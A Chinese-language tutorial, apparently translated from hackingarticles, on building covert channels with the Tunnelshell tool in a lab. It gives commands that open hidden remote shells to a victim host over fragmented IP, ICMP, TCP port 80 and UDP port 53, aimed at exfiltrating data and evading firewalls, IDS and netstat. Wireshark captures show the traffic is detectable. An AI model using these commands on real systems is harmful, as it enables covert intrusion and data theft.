**通常，黑客会使用隐蔽网络来躲避防火墙和IDS等。在本文中，你将学习如何通过不可检测的网络从目标主机窃取数据。这种类型的网络被称为隐蔽信道，而这些流量在网络监控设备/应用和网络管理员看来像是一般的正常流量。两个端点用户可以利用隐蔽信道，进行无法被检测到的网络通信。**

红队通过合法的网络使用隐蔽信道在红队活动中进行数据泄露，数据泄漏是在两个端点之间秘密共享数据的过程。

 **声明：本文仅用于技术探讨，严禁用于其他用途。**

## 什么是 **隐蔽信道（** **covert channel）？**

隐蔽一词意味着“隐藏或不可检测”，而信道是“通信模式”，因此隐蔽信道表示不可检测的通信网络。了解加密通信和隐蔽通信之间的区别非常重要。在隐蔽通信中，数据流被未经授权的一方篡改和持久。然而，加密通信并不掩盖通过加密在两个端点之间传输的数据进行通信的事实。

##  **covert channel 的类型**

>  **网络隐蔽存储信道：** 发送者直接或间接些目标值，接收者直接或间接接读目标值。
>
>  **网络隐蔽时间信道：** 发送者通过时域上调制使用资源（例如CPU）发送信息，接收者能够观测到并对信息进行解码。

与存储隐蔽信道相比，时间隐蔽信道又称为无记忆通道，它不能长久存储信息。发送者发送的信息接收者必须及时接受，否则传送的信息将会消失。

## 使用 Tunnelshell 进行隐蔽信道攻击

几乎可以使用任何协议来建立隐蔽信道。绝大多数隐蔽信道研究都是基于第3层（网络）和第4层（传输）协议，如ICMP，IP和TCP。经常使用的还有第7层（应用）协议诸如HTTP和DNS。这种机制用于在不提醒网络防火墙和IDS的情况下传送信息，而且netstat无法检测到。

##  **Tunnelshell 简介**

Tunnelshell是一个用C编写的程序适用于Linux用户，它使用客户端 -服务器范例。服务器打开/bin/sh客户端可以通过虚拟隧道进行访问。它支持多种协议，包括TCP，UDP，ICMP和RawIP。此外，数据包可以分段处理以躲避防火墙和IDS的检测。

 **实验环境**

> 服务器（Kali Linux）
>
> 客户端（Ubuntu18.04）
>
> [Tunnelshell](https://packetstormsecurity.com/search/files/?q=Tunnelshell)

这里，假设我们已经通过c2服务器与受害者机器建立了会话。现在，我们需要为数据泄露创建一个隐藏的信道，因此我们需要在两个端点上安装tunnelshell。

下载后，解压缩文件并进行编译，如下所示：

    
    
    tar xvfz tunnelshell_2.3.tgz
    make

![Covert
Channel](https://image.3001.net/images/20190428/1556411637_5cc4f4f52ad9e.png!small)

同样，在另一个端点（受害者的机器）重复相同的操作，完成后在终端中执行以下命令，打开服务器的信道（Attacker）。

    
    
    sudo ./tunneld

默认情况下，它会发送分段数据包，该数据包会在目标端点重组以躲避防火墙和IDS。

![Covert
Channel](https://image.3001.net/images/20190428/1556411661_5cc4f50dc0f27.png!small)

现在要与tunnelshell连接，我们需要在服务器（攻击者的机器）上执行以下命令，该命令将建立用于数据泄露的隐蔽信道。

语法: ./tunnel -i <session id (0-65535)> -d <包发送延迟> -s <packet size> -t <tunnel
类型> -o <protocol> -p <port> -m <ICMP 查询> -a <ppp 接口> <受害者 IP>

    
    
    ./tunnel -t frag 10.10.10.2

 **frag：**
使用IPv4分段数据包来封装数据。当某些路由器和防火墙（如Cisco路由器和默认Linux安装）收到第四层没有标头的分段数据包时，即使它们有拒绝它的规则，也会允许它们通过。可以看到它已成功连接到10.10.10.2，我们将访问受害者机器的shell。

![Covert
Channel](https://image.3001.net/images/20190428/1556411677_5cc4f51dc1e84.png!small)

正如我说的那样，如果你使用network
statics检查网络连接状态，你将不会看到任何关于tunnelshell的进程ID。从下图中你可以看到，在ps命令的帮助下我已经检查了tunnelshell的进程，并尝试通过netstat检查其进程ID。

    
    
    ps |grep .tunneld
    netstat –ano

![Covert
Channel](https://image.3001.net/images/20190428/1556411696_5cc4f530dc92e.png!small)

让我们通过Wireshark来看看10.10.10.1（攻击者的IP）和10.
10.10.2（受害者的IP）之间产生的网络流量。网络流在两个端点之间看起来像是一般的流量，但如果正确监视，则网络管理员可以嗅探到数据包。正如你所看到的，Wireshark捕获了隐蔽的流量并嗅探到了在两个端点设备之间传输的数据。

![Covert
Channel](https://image.3001.net/images/20190428/1556411738_5cc4f55ae5968.png!small)

## 隐蔽的 **ICMP 信道**

我们知道Ping是使用ICMP通信的，通过发出icmp echo request包，收到icmp echo
reply包在两台主机之间建立连接。因此，执行以下命令：

    
    
    sudo ./tunneld -t icmp -m echo-reply, echo

![Covert
Channel](https://image.3001.net/images/20190428/1556411732_5cc4f554e2ad6.png!small)

现在要与tunnelshell连接，我们需要在服务器（攻击者的机器）上执行以下命令，该命令将建立用于数据泄露的隐蔽信道。

    
    
    ./tunnel -t icmp -m echo-reply,echo 10.10.10.2

正如你看到的它已成功连接到10.10.10.2，并且攻击者能够访问受害者计算机的shell。

![Covert
Channel](https://image.3001.net/images/20190428/1556411749_5cc4f5656ebd6.png!small)

同样，如果你通过Wireshark捕获流量，那么你将会注意到ICMP echo
request和reply数据包正在两个端点之间传输。如果你尝试分析这些数据包，那么你将能够看到哪种payload被作为ICMP数据正在传输。

![Covert
Channel](https://image.3001.net/images/20190428/1556411769_5cc4f5792a656.png!small)

## 隐蔽的 **HTTP 信道**

在没有三步握手的情况下它建立了一个虚拟的TCP连接，也不绑定任何端口，因此你可以使用已经由另一个进程使用的端口，执行以下命令：

    
    
    sudo  ./tunneld -t tcp -p 80,2000

![Covert
Channel](https://image.3001.net/images/20190428/1556411782_5cc4f586465f5.png!small)

现在要与tunnelshell连接，我们需要在服务器（攻击者的机器）上执行以下命令，该命令将建立用于数据泄露的隐蔽信道。

    
    
    ./tunnel -t tcp -p 80,2000 10.10.10.2

正如你看到的，它已成功连接到了10.10.10.2，并且攻击者能够再次访问受害者计算机的shell。

![Covert
Channel](https://image.3001.net/images/20190428/1556411795_5cc4f593b732d.png!small)

通过网络流量你可以看到源和目标之间建立了tcp通信，但并没有真正的三步握手。

![Covert
Channel](https://image.3001.net/images/20190428/1556411820_5cc4f5ac75767.png!small)

## 隐蔽的 DNS **信道**

要建立DNS隐蔽信道，我们需要在两个端点机器上运行UDP隧道模式。因此，在受害者的机器上我们执行以下命令：

    
    
    sudo ./tunneld -t udp -p 53,2000

![Covert
Channel](https://image.3001.net/images/20190428/1556411833_5cc4f5b9e16e1.png!small)

同样，在你的（攻击者）机器上执行以下命令以连接隧道。

    
    
    ./tunnel -t udp -p 53,2000 10.10.10.2

![Covert
Channel](https://image.3001.net/images/20190428/1556411847_5cc4f5c703680.png!small)

正如你所看到的，DNS错误数据包包含在两个端点机器之间传输的数据。

![Covert
Channel](https://image.3001.net/images/20190428/1556411859_5cc4f5d3444e6.png!small)

## 总结

隐蔽信道在数据泄露时不会发送加密的数据包，因此它很容易被嗅探到，网络管理员可以轻松的进行数据丢失防护和风险管理。

 ***参考来源：[hackingarticles](https://www.hackingarticles.in/covert-channel-the-hidden-network/)，FB小编secist编译，转载请注明来自FreeBuf.COM**  

